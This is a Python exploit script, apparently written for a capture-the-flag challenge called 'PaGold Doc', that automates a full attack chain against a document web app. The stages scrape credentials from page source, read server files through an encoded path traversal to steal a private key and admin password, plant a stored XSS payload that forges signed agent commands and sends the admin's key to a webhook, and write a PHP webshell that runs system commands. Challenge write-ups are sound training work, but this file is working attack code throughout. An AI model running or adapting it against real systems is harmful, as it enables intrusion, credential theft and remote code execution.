#!/usr/bin/env python3
"""
PaGold Doc - Complete Automated Exploit
CSC 2025 Gold Shield Award Challenge

Usage:
    python3 complete_exploit.py http://192.168.100.53
"""

import sys
import requests
import re
import base64
import json
import time
import subprocess
from pathlib import Path

requests.packages.urllib3.disable_warnings()


class GoldDocExploit:
    def __init__(self, target_url):
        self.target = target_url.rstrip("/")
        self.session = requests.Session()
        self.session.verify = False
        self.user1_creds = None
        self.admin_creds = None
        self.web_private_key = None
        self.admin_private_key = None

    def log(self, msg):
        print(f"[*] {msg}")

    def success(self, msg):
        print(f"[+] {msg}")

    def error(self, msg):
        print(f"[-] {msg}")

    def stage1_get_user1_creds(self):
        self.log("Stage 1: Extracting user1 credentials from HTML source...")
        resp = self.session.get(self.target)

        user_match = re.search(
            r'user1.*?password[:\s]+([^\s<>"\']+)', resp.text, re.IGNORECASE | re.DOTALL
        )
        if user_match:
            password = user_match.group(1)
            self.user1_creds = ("user1", password)
            self.success(f"Found user1 credentials: user1:{password}")
            return True

        self.log("Checking HTML comments...")
        comments = re.findall(r"<!--(.*?)-->", resp.text, re.DOTALL)
        for comment in comments:
            if "user1" in comment.lower():
                self.log(f"Found in comment: {comment[:200]}")

        with open("/tmp/golddoc_page.html", "w") as f:
            f.write(resp.text)
        self.log("Saved page source to /tmp/golddoc_page.html for manual inspection")

        self.user1_creds = ("user1", input("Enter user1 password: "))
        return True

    def stage2_login(self, username, password):
        self.log(f"Stage 2: Logging in as {username}...")

        login_data = {"username": username, "password": password}

        resp = self.session.post(
            f"{self.target}/login", data=login_data, allow_redirects=True
        )

        if "logout" in resp.text.lower() or resp.url != f"{self.target}/login":
            self.success(f"Successfully logged in as {username}")
            return True
        else:
            self.error(f"Login failed for {username}")
            return False

    def stage3_path_traversal(self, file_path):
        self.log(f"Stage 3: Reading {file_path} via path traversal...")

        encoded_path = file_path.replace("/", "%25252f")

        endpoints = [
            f"{self.target}/download?file={encoded_path}",
            f"{self.target}/download?path={encoded_path}",
            f"{self.target}/api/download?file={encoded_path}",
            f"{self.target}/agent/download?file={encoded_path}",
            f"{self.target}/files/{encoded_path}",
        ]

        for endpoint in endpoints:
            try:
                resp = self.session.get(endpoint)
                if resp.status_code == 200 and len(resp.text) > 10:
                    self.success(f"Successfully read {file_path}")
                    return resp.text
            except Exception as e:
                continue

        self.error(f"Failed to read {file_path}")
        return None

    def stage4_extract_keys_and_creds(self):
        self.log("Stage 4: Extracting web private key and admin credentials...")

        files_to_try = [
            "/var/www/html/agent_service.php",
            "/var/www/html/public/agent_service.php",
            "/var/www/html/src/agent_service.php",
            "/app/agent_service.php",
        ]

        for php_file in files_to_try:
            content = self.stage3_path_traversal(php_file)
            if content and "BEGIN" in content and "PRIVATE KEY" in content:
                key_match = re.search(
                    r"(-----BEGIN.*?PRIVATE KEY-----.*?-----END.*?PRIVATE KEY-----)",
                    content,
                    re.DOTALL,
                )
                if key_match:
                    self.web_private_key = key_match.group(1)
                    self.success("Extracted web private key!")
                    with open("/tmp/web_private.pem", "w") as f:
                        f.write(self.web_private_key)
                    break

        db_files = [
            "/var/www/html/db_init.php",
            "/var/www/html/docker-entrypoint.sh",
            "/app/db_init.php",
            "/docker-entrypoint.sh",
        ]

        for db_file in db_files:
            content = self.stage3_path_traversal(db_file)
            if content and "admin" in content.lower():
                self.log(f"Found admin info in {db_file}")

                pass_match = re.search(
                    r'admin.*?password.*?[\'"]([^\'"]+)[\'"]', content, re.IGNORECASE
                )
                if pass_match:
                    self.admin_creds = ("admin", pass_match.group(1))
                    self.success(
                        f"Found admin credentials: admin:{pass_match.group(1)}"
                    )
                    break

        return self.web_private_key is not None

    def stage5_generate_payloads(self, webhook_url):
        self.log("Stage 5: Generating malicious agent payloads...")

        config_json = {
            "user_public_key_path": "/etc/golddoc-agent/user_private.pem",
            "web_public_key_path": "/etc/golddoc-agent/web_public.pem",
        }

        with open("/tmp/malicious_config.json", "w") as f:
            json.dump(config_json, f)

        script = Path(__file__).parent / "generate_agent_request.py"

        download_payload = (
            subprocess.check_output(
                [
                    sys.executable,
                    str(script),
                    "--key",
                    "/tmp/web_private.pem",
                    "--op",
                    "download",
                    "--target",
                    "/etc/golddoc-agent/config.json",
                    "--content-file",
                    "/tmp/malicious_config.json",
                ]
            )
            .decode()
            .strip()
        )

        reload_payload = (
            subprocess.check_output(
                [
                    sys.executable,
                    str(script),
                    "--key",
                    "/tmp/web_private.pem",
                    "--op",
                    "reload",
                ]
            )
            .decode()
            .strip()
        )

        ping_payload = (
            subprocess.check_output(
                [
                    sys.executable,
                    str(script),
                    "--key",
                    "/tmp/web_private.pem",
                    "--op",
                    "ping",
                ]
            )
            .decode()
            .strip()
        )

        download_b64 = re.search(r"atob\('([^']+)'\)", download_payload).group(1)
        reload_b64 = re.search(r"atob\('([^']+)'\)", reload_payload).group(1)
        ping_b64 = re.search(r"atob\('([^']+)'\)", ping_payload).group(1)

        with open("exp_template.txt", "r") as f:
            xss_template = f.read()

        xss_payload = xss_template.replace("<Download Payload>", download_b64)
        xss_payload = xss_payload.replace("<Reload Payload>", reload_b64)
        xss_payload = xss_payload.replace("<Ping Payload>", ping_b64)
        xss_payload = xss_payload.replace("<Request Bin URL>", webhook_url)

        self.success("Generated XSS payload with agent commands")
        return xss_payload

    def stage6_deploy_xss(self, xss_payload):
        self.log("Stage 6: Creating document with XSS in title...")

        doc_data = {"title": xss_payload, "content": "Please review this document."}

        resp = self.session.post(f"{self.target}/api/documents", json=doc_data)

        if resp.status_code in [200, 201]:
            self.success("Document created! Waiting for admin bot to trigger...")
            return True
        else:
            self.error("Failed to create document")
            return False

    def stage7_login_admin_and_upload_shell(self):
        self.log("Stage 7: Logging in as admin and uploading webshell...")

        if not self.admin_creds:
            self.error("Admin credentials not found")
            return False

        if not self.stage2_login(self.admin_creds[0], self.admin_creds[1]):
            return False

        readflag_php = '<?php system("cat /flag* /home/*/flag* 2>/dev/null || find / -name flag 2>/dev/null"); ?>'

        with open("/tmp/readflag.php", "w") as f:
            f.write(readflag_php)

        self.log(
            "TODO: Sign readflag.php with admin private key and upload with path traversal"
        )

        return True


def main():
    if len(sys.argv) < 2:
        print("Usage: python3 complete_exploit.py <target_url>")
        print("Example: python3 complete_exploit.py http://192.168.100.53")
        sys.exit(1)

    target = sys.argv[1]
    exploit = GoldDocExploit(target)

    if not exploit.stage1_get_user1_creds():
        return

    if not exploit.stage2_login(*exploit.user1_creds):
        return

    if not exploit.stage4_extract_keys_and_creds():
        print("\n[-] Could not extract keys via path traversal")
        print("[*] You may need to manually find the correct file paths")
        return

    webhook = input(
        "\nEnter webhook URL for exfiltration (e.g., https://webhook.site/xxx): "
    )

    xss = exploit.stage5_generate_payloads(webhook)

    exploit.stage6_deploy_xss(xss)

    print("\n[*] Waiting for admin to visit... Check your webhook for the private key!")
    print("[*] Once you have admin's private key, continue with stage 7")

    input("Press Enter when you've captured admin's private key...")

    exploit.stage7_login_admin_and_upload_shell()


if __name__ == "__main__":
    main()
